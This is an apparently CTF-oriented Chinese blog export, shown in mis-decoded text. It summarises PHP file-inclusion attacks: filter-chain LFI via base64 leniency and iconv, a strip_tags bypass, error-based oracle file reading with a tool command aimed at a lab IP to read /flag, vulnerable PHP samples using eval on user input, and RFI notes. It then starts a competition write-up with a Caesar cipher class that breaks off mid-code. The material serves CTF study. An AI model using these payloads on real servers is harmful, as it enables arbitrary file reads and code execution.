<p>å…·ä½“åˆ†æåŸç†çš„æ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/213235">phpæºç åˆ†æ require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶</a></p>
<h2 id="FilterChain-åˆ©ç”¨-ï¼ˆiconv-LFIï¼‰"><a href="#FilterChain-åˆ©ç”¨-ï¼ˆiconv-LFIï¼‰" class="headerlink" title="FilterChain åˆ©ç”¨ ï¼ˆiconv LFIï¼‰"></a>FilterChain åˆ©ç”¨ ï¼ˆiconv LFIï¼‰</h2><p><a href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI?</a></p>
<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åˆ©ç”¨äº†PHP Base64 Filter å®½æ¾çš„è§£æç‰¹æ€§</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//è§£ç çš„å­—ç¬¦ä¸²ä¸­åŒ…å«æ— æ•ˆå­—ç¬¦ï¼Œé‚£ä¹ˆå°±ä¼šå¿½ç•¥æ‰é‚£äº›å­—ç¬¦ï¼Œåªå¯¹æœ‰æ•ˆå­—ç¬¦è¿›è¡Œè§£ç </span><br><br>dr0n11       --&gt;  ZHIwbjEx<br>ZH<span class="hljs-meta">&lt;?</span>Iw-bjEx  --&gt;  dr0n11<br></code></pre></td></tr></table></figure>

<p>å³ä½¿æˆ‘ä»¬åœ¨ä½¿ç”¨å…¶ä»–å­—ç¬¦ç¼–ç æ—¶äº§ç”Ÿäº†ä¸å¯è§å­—ç¬¦ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ convert.base64-decode æ¥å»æ‰éæ³•å­—ç¬¦ï¼Œç•™ä¸‹æˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦</p>
<h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>å› ä¸ºä¸åŒçš„é¶æœºç¯å¢ƒæœ‰ä¸åŒçš„å­—ç¬¦é›†ï¼Œæ‰€ä»¥å¯èƒ½ä¼šæ‰“ä¸é€šï¼Œè¿™æ—¶å¯ä»¥å…ˆfuzzä¸€ä¸‹ï¼Œå¾—åˆ°æ›´ä¸ºé€šç”¨çš„å­—ç¬¦é›†æ„é€ çš„POC</p>
<p><strong><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a></strong></p>
<p><strong><a href="https://github.com/synacktiv/php_filter_chain_generator">PHP filter chain generator</a></strong></p>
<p>ä¹Ÿå¯ä»¥ç”¨æ¥ç»•è¿‡ä¸€äº›é™å®šæ¡ä»¶</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) === False) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;failed to read&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nothing here&#x27;</span>);<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>python3 php_filter_chain_generator.py --chain &#39;aaa&#39;</code></p>
<h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p><code>string.strip_tags</code>è¿‡æ»¤å™¨å’Œ<code>&lt;</code>æ­é…ä½¿ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">(PHP <span class="hljs-number">4</span>, PHP <span class="hljs-number">5</span>, PHP <span class="hljs-number">7</span>, PHP <span class="hljs-number">8</span>)<br>strip_tags â€” ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡ç­¾<br></code></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬ä½¿ç”¨<code>php_filter_chain_generator</code>ç”ŸæˆFilterChainçš„æ—¶å€™åœ¨ç»“å°¾æ·»åŠ ä¸€ä¸ª&lt;æ ‡ç­¾</p>
<p><img src="/img/summary/file_include-13.png"></p>
<p><img src="/img/summary/file_include-14.png"></p>
<p>åœ¨ç»“å°¾æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ª<code>string.strip_tags</code>ï¼Œè¿‡æ»¤åé¢çš„ä¹±å­—ç¬¦</p>
<p><img src="/img/summary/file_include-15.png"></p>
<h2 id="ä¾§ä¿¡é“è¯»å–æ–‡ä»¶-åŸºäºé”™è¯¯çš„oracleæ–¹å¼ï¼ˆerror-based-oracleï¼‰"><a href="#ä¾§ä¿¡é“è¯»å–æ–‡ä»¶-åŸºäºé”™è¯¯çš„oracleæ–¹å¼ï¼ˆerror-based-oracleï¼‰" class="headerlink" title="ä¾§ä¿¡é“è¯»å–æ–‡ä»¶-åŸºäºé”™è¯¯çš„oracleæ–¹å¼ï¼ˆerror-based-oracleï¼‰"></a>ä¾§ä¿¡é“è¯»å–æ–‡ä»¶-åŸºäºé”™è¯¯çš„oracleæ–¹å¼ï¼ˆerror-based-oracleï¼‰</h2><p>ä¸ FilterChain åˆ©ç”¨ç›¸ä¼¼</p>
<p>é™åˆ¶æ¡ä»¶ï¼š<br>1ï¼šphp 5.3 ä»¥ä¸‹ä¸èƒ½ç”¨<br>2ï¼šæåº¦ä¾èµ–ç³»ç»Ÿ iconv æä¾›çš„å­—ç¬¦é›†</p>
<p>ä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//2024çº¢æ˜è°·</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><a href="https://tttang.com/archive/1755">The End of AFR?</a> éå¸¸è¯¦ç»†çš„è§£è¯»äº†å·¥ä½œåŸç†</p>
<blockquote>
<p>ä½¿ç”¨ UCS-4LE ç­‰ç¼–ç æŠ€å·§è®© PHP äº§ç”Ÿå†…å­˜é”™è¯¯å¯¼è‡´æœåŠ¡å™¨äº§ç”Ÿ 500 é”™è¯¯ï¼Œé…åˆ dechunk ç¼–ç ä½¿å¾—å‰é¢çš„é”™è¯¯æ­£å¸¸åŒ–ä»è€Œè·å¾—ä¸€ä¸ªç›²æ³¨çš„åˆ¤æ–­ä¾æ®ï¼Œä½¿ç”¨è¯¥ä¾æ®ä»¥åŠç¼–ç æŠ€å·§é€ä¸ªåˆ¤æ–­ç›²æ³¨å‡ºæ–‡ä»¶å†…å®¹ï¼Œè¿›è€Œå¯ä»¥é€ æˆä»»æ„æ–‡ä»¶å†…å®¹è¯»å–ã€‚</p>
</blockquote>
<h3 id="å—å½±å“çš„å‡½æ•°"><a href="#å—å½±å“çš„å‡½æ•°" class="headerlink" title="å—å½±å“çš„å‡½æ•°"></a>å—å½±å“çš„å‡½æ•°</h3><p>åŸºæœ¬ä¸Šåªè¦å¯¹æ–‡ä»¶æ‰§è¡Œæ“ä½œï¼ŒåŒ…æ‹¬è¯»å–ã€å†™å…¥æˆ–å‘æ–‡ä»¶è¿½åŠ å†…å®¹ï¼Œæˆ–è€…ä½¿ç”¨äº†é“¾æ¥åˆ°è¯¥æ–‡ä»¶çš„æµéƒ½ä¼šå—åˆ°å½±å“</p>
<table>
<thead>
<tr>
<th>Function</th>
<th>Pattern</th>
</tr>
</thead>
<tbody><tr>
<td>file_get_contents</td>
<td>file_get_contents($_POST[0]);</td>
</tr>
<tr>
<td>readfile</td>
<td>readfile($_POST[0]);</td>
</tr>
<tr>
<td>finfo-&gt;file</td>
<td>$file &#x3D; new finfo(); $fileinfo &#x3D; $file-&gt;file($_POST[0], FILEINFO_MIME);</td>
</tr>
<tr>
<td>getimagesize</td>
<td>getimagesize($_POST[0]);</td>
</tr>
<tr>
<td>md5_file</td>
<td>md5_file($_POST[0]);</td>
</tr>
<tr>
<td>sha1_file</td>
<td>sha1_file($_POST[0]);</td>
</tr>
<tr>
<td>hash_file</td>
<td>hash_file(â€˜md5â€™, $_POST[0]);</td>
</tr>
<tr>
<td>file</td>
<td>file($_POST[0]);</td>
</tr>
<tr>
<td>parse_ini_file</td>
<td>parse_ini_file($_POST[0]);</td>
</tr>
<tr>
<td>copy</td>
<td>copy($_POST[0], â€˜&#x2F;tmp&#x2F;testâ€™);</td>
</tr>
<tr>
<td>file_put_contents (only target read only with this)</td>
<td>file_put_contents($_POST[0], â€œâ€);</td>
</tr>
<tr>
<td>stream_get_contents</td>
<td>$file &#x3D; fopen($_POST[0], â€œrâ€); stream_get_contents($file);</td>
</tr>
<tr>
<td>fgets</td>
<td>$file &#x3D; fopen($_POST[0], â€œrâ€); fgets($file);</td>
</tr>
<tr>
<td>fread</td>
<td>$file &#x3D; fopen($_POST[0], â€œrâ€); fread($file, 10000);</td>
</tr>
<tr>
<td>fgetc</td>
<td>$file &#x3D; fopen($_POST[0], â€œrâ€); fgetc($file);</td>
</tr>
<tr>
<td>fgetcsv</td>
<td>$file &#x3D; fopen($_POST[0], â€œrâ€); fgetcsv($file, 1000, â€œ,â€);</td>
</tr>
<tr>
<td>fpassthru</td>
<td>$file &#x3D; fopen($_POST[0], â€œrâ€); fpassthru($file);</td>
</tr>
<tr>
<td>fputs</td>
<td>$file &#x3D; fopen($_POST[0], â€œrwâ€); fputs($file, 0);</td>
</tr>
</tbody></table>
<h3 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p><a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">php_filter_chains_oracle_exploit</a></p>
<p><code>python3 filters_chain_oracle_exploit.py --target http://172.20.35.66/ --parameter 0 --file /flag</code></p>
<p><img src="/img/summary/file_include-16.png"></p>
<h2 id="ä¼ªåè®®å»é™¤å¤šä½™å­—ç¬¦"><a href="#ä¼ªåè®®å»é™¤å¤šä½™å­—ç¬¦" class="headerlink" title="ä¼ªåè®®å»é™¤å¤šä½™å­—ç¬¦"></a>ä¼ªåè®®å»é™¤å¤šä½™å­—ç¬¦</h2><p>ä¾‹å­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;lajilajilajilajilaji&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>].<span class="hljs-string">&#x27;lajilajilajilajilaji&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>].<span class="hljs-string">&quot;.txt&quot;</span>,<span class="hljs-variable">$content</span>);<br><br><span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;123.txt&#x27;</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]));<br></code></pre></td></tr></table></figure>

<p>åŸç†è¿˜æ˜¯åŸºäºbase64çš„å®½æ¾æ€§</p>
<p>æ‰€ä»¥åªéœ€è¦å°†åƒåœ¾å­—ç¬¦è½¬æ¢æˆbase64å­—ç¬¦é›†ä»¥å¤–çš„å­—ç¬¦å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> =<span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;utf-16&#x27;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$payload</span>);<br><br><span class="hljs-comment">// 1ï¼šæˆ‘ä»¬éœ€è¦çš„æ•°æ®</span><br><span class="hljs-comment">// system</span><br><br><span class="hljs-comment">// 2ï¼šbase64å</span><br><span class="hljs-comment">// c3lzdGVt</span><br><br><span class="hljs-comment">// 3ï¼šutf-8è½¬æ¢ä¸ºutf-16</span><br><span class="hljs-comment">// %FF%FEc%003%00l%00z%00d%00G%00V%00t%00</span><br></code></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;lajilajilajilajilaji%FF%FEc%003%00l%00z%00d%00G%00V%00t%00lajilajilajilajilaji&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;utf-16&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$payload</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>;<br><br><span class="hljs-comment">// 1ï¼šæ‹¼æ¥åçš„æ•°æ®</span><br><span class="hljs-comment">// lajilajilajilajilaji%FF%FEc%003%00l%00z%00d%00G%00V%00t%00lajilajilajilajilaji</span><br><br><span class="hljs-comment">// 2ï¼šutf-16è½¬æ¢ä¸ºutf-8</span><br><span class="hljs-comment">// ä¹±ç c3lzdGVtä¹±ç </span><br><br><span class="hljs-comment">// 3ï¼šbase64_decode</span><br><span class="hljs-comment">// system</span><br></code></pre></td></tr></table></figure>

<p>è½¬æˆä¼ªåè®®çš„å†™æ³•</p>
<p><code>php://filter/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=</code></p>
<p>ä¸åŒç¼–ç <a href="https://www.novel.tools/decode">åœ¨çº¿è½¬æ¢ç½‘ç«™</a></p>
<p>phpè¿˜æœ‰å¾ˆå¤šæ”¯æŒçš„å­—ç¬¦ç¼–ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">UCS-<span class="hljs-number">4</span>*<br>UCS-<span class="hljs-number">4</span>BE<br>UCS-<span class="hljs-number">4</span>LE*<br>UCS-<span class="hljs-number">2</span><br>UCS-<span class="hljs-number">2</span>BE<br>UCS-<span class="hljs-number">2</span>LE<br>UTF-<span class="hljs-number">32</span>*<br>UTF-<span class="hljs-number">32</span>BE*<br>UTF-<span class="hljs-number">32</span>LE*<br>UTF-<span class="hljs-number">16</span>*<br>UTF-<span class="hljs-number">16</span>BE*<br>UTF-<span class="hljs-number">16</span>LE*<br>UTF-<span class="hljs-number">7</span><br>UTF7-IMAP<br>UTF-<span class="hljs-number">8</span>*<br>ASCII*<br>EUC-JP*<br>SJIS*<br>eucJP-win*<br>SJIS-win*<br>ISO-<span class="hljs-number">2022</span>-JP<br>ISO-<span class="hljs-number">2022</span>-JP-MS<br>CP932<br>CP51932<br>SJIS-macï¼ˆåˆ«åï¼šMacJapaneseï¼‰<br>SJIS-Mobile<span class="hljs-comment">#DOCOMOï¼ˆåˆ«åï¼šSJIS-DOCOMOï¼‰</span><br>SJIS-Mobile<span class="hljs-comment">#KDDIï¼ˆåˆ«åï¼šSJIS-KDDIï¼‰</span><br>SJIS-Mobile<span class="hljs-comment">#SOFTBANKï¼ˆåˆ«åï¼šSJIS-SOFTBANKï¼‰</span><br>UTF-<span class="hljs-number">8</span>-Mobile<span class="hljs-comment">#DOCOMOï¼ˆåˆ«åï¼šUTF-8-DOCOMOï¼‰</span><br>UTF-<span class="hljs-number">8</span>-Mobile<span class="hljs-comment">#KDDI-A</span><br>UTF-<span class="hljs-number">8</span>-Mobile<span class="hljs-comment">#KDDI-Bï¼ˆåˆ«åï¼šUTF-8-KDDIï¼‰</span><br>UTF-<span class="hljs-number">8</span>-Mobile<span class="hljs-comment">#SOFTBANKï¼ˆåˆ«åï¼šUTF-8-SOFTBANKï¼‰</span><br>ISO-<span class="hljs-number">2022</span>-JP-MOBILE<span class="hljs-comment">#KDDIï¼ˆåˆ«åï¼šISO-2022-JP-KDDIï¼‰</span><br>JIS<br>JIS-ms<br>CP50220<br>CP50220raw<br>CP50221<br>CP50222<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>*<br>ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>*<br>byte2be<br>byte2le<br>byte4be<br>byte4le<br>BASE64<br>HTML-ENTITIESï¼ˆåˆ«åï¼šHTMLï¼‰<br><span class="hljs-number">7</span>bit<br><span class="hljs-number">8</span>bit<br>EUC-CN*<br>CP936<br>GB18030<br>HZ<br>EUC-TW*<br>CP950<br>BIG-<span class="hljs-number">5</span>*<br>EUC-KR*<br>UHCï¼ˆåˆ«åï¼šCP949ï¼‰<br>ISO-<span class="hljs-number">2022</span>-KR<br>Windows-<span class="hljs-number">1251</span>ï¼ˆåˆ«åï¼šCP1251ï¼‰<br>Windows-<span class="hljs-number">1252</span>ï¼ˆåˆ«åï¼šCP1252ï¼‰<br>CP866ï¼ˆåˆ«åï¼šIBM866ï¼‰<br>KOI8-R*<br>KOI8-U*<br>ArmSCII-<span class="hljs-number">8</span>ï¼ˆåˆ«åï¼šArmSCII8ï¼‰<br></code></pre></td></tr></table></figure>


<h1 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h1><p>è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRemote File Inclusionï¼Œ RFIï¼‰æ˜¯æŒ‡åŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œéœ€è¦åœ¨<code>php.ini</code>ä¸­è®¾ç½®<code>allow_url_include=On</code></p>
<p>è¿œç¨‹åŒ…å«ä¸æœ¬åœ°åŒ…å«æ²¡æœ‰åŒºåˆ«ï¼Œæ— éæ˜¯æ”¯æŒè¿œç¨‹åŠ è½½ï¼Œæ›´å®¹æ˜“getshellï¼Œæ— è®ºæ˜¯å“ªç§æ‰©å±•åï¼Œåªè¦éµå¾ªPHPè¯­æ³•è§„èŒƒï¼ŒPHPè§£æå™¨å°±ä¼šå¯¹å…¶è§£æã€‚</p>
<p>å¦‚æœè¿‡æ»¤äº†ç‚¹å¯ä»¥å°†<code>ip</code>è½¬ä¸º<code>int</code></p>
<p><img src="/img/summary/file_include-4.png"></p>
<p>å‚è€ƒæ–‡ç« 1ï¼š<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿°</a><br>å‚è€ƒæ–‡ç« 2ï¼š<a href="http://www.gem-love.com/2022/06/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%A0%E7%A7%8D%E4%B8%8D%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/">æ–‡ä»¶åŒ…å«çš„å‡ ç§ä¸å¸¸è§„åˆ©ç”¨å§¿åŠ¿</a><br>å‚è€ƒæ–‡ç« 3ï¼š<a href="https://xz.aliyun.com/t/12939">PHP Filteré“¾â€”â€”åŸºäºoracleçš„æ–‡ä»¶è¯»å–æ”»å‡»</a></p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title>2021é‡‘ç –ä¼ä¸šä¿¡æ¯ç³»ç»Ÿå®‰å…¨å†³èµ›</title>
    <url>/posts/281f37d9/</url>
    <content><![CDATA[<p>2021å¹´å°±æ¯”å®Œäº†åˆèµ›ï¼Œä½†æ˜¯å› ä¸ºç–«æƒ…æ²¡èƒ½åŠæˆå†³èµ›ï¼Œä»Šå¹´6æœˆé‡å¯äº†æ¯”èµ›</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto-1"></a>Crypto-1</h2><p>base64-&gt;base32-&gt;base64â€“&gt;base64<br><img src="/img/wp/2021/2021jinzhuan-1.png"></p>
<h2 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto-2"></a>Crypto-2</h2><p>å˜ç§å‡¯æ’’<br><img src="/img/wp/2021/2021jinzhuan-2.png"></p>
<p>ä¸Šå›¾å¼•ç”¨çš„<code>caesar</code>æ˜¯è‡ªå®šä¹‰çš„æ¨¡å—</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">caesar</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Type==1: Offset letters only</span><br><span class="hljs-string">        Type==2: Offset numbers only</span><br><span class="hljs-string">        Type==3: 1+2</span><br><span class="hljs-string">        Type==4: All characters</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        text=<span class="hljs-string">&quot;&quot;</span><br>        self.<span class="hljs-type">Type</span>=<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setType</span>(<span class="hljs-params">self,<span class="hljs-type">Type</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-type">Type</span> <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]:<br>            self.<span class="hljs-type">Type</span>=<span class="hljs-type">Type</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid type&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">self,text,num</span>):<br>        entext=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                <span class="hljs-keyword">if</span> text[i].isupper():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">65</span>+num)%<span class="hljs-number">26</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">65</span>)<br>                <span class="hljs-keyword">elif</span> text[i].islower():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">97</span>+num)%<span class="hljs-number">26</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">97</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    entext+=text[i]<br>            self.entext=entext<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                <span class="hljs-keyword">if</span> text[i].isnumeric():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">0x30</span>+num)%<span class="hljs-number">10</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">0x30</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    entext+=text[i]<br>            self.entext=entext<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                <span class="hljs-keyword">if</span> text[i].isupper():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">65</span>+num)%<span class="hljs-number">26</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">65</span>)<br>                <span class="hljs-keyword">elif</span> text[i].islower():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">97</span>+num)%<span class="hljs-number">26</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">97</span>)<br>                <span class="hljs-keyword">elif</span> text[i].isnumeric():<br>                    decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">0x30</span>+num)%<span class="hljs-number">10</span><br>                    entext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">0x30</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    entext+=text[i]<br>            self.entext=entext<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">4</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">0x30</span>+num)%<span class="hljs-number">128</span><br>                entext+=<span class="hljs-built_in">chr</span>(decup)<br>            self.entext=entext<br>        <span class="hljs-keyword">return</span> self.entext<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self,text,num=<span class="hljs-number">0</span></span>):<br>        detext=<span class="hljs-string">&#x27;&#x27;</span><br>        self.delist=[]<br>        self.detext=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num%<span class="hljs-number">26</span>,<span class="hljs-number">26</span>):<br>                detext=<span class="hljs-string">&#x27;&#x27;</span><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(text)):<br>                    <span class="hljs-keyword">if</span> text[i].isupper():<br>                        decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">65</span>+j)%<span class="hljs-number">26</span><br>                        detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">65</span>)<br>                    <span class="hljs-keyword">elif</span> text[i].islower():<br>                        decup=(<span class="hljs-built_in">ord</span>(text[i])-<span class="hljs-number">97</span>+j)%<span class="hljs-number">26</span><br>                        detext+=<span class="hljs-built_in">chr</span>(decup+<span class="hljs-number">97</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        detext+=text[i]<br>                self.delist.append(detext)<br>                <span class="hljs-keyword">if</span> num:<br>                    self.detext=detext<br>        <span class="hljs-keyword">elif</span> self.<span class="hljs-type">Type</span>==<span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span 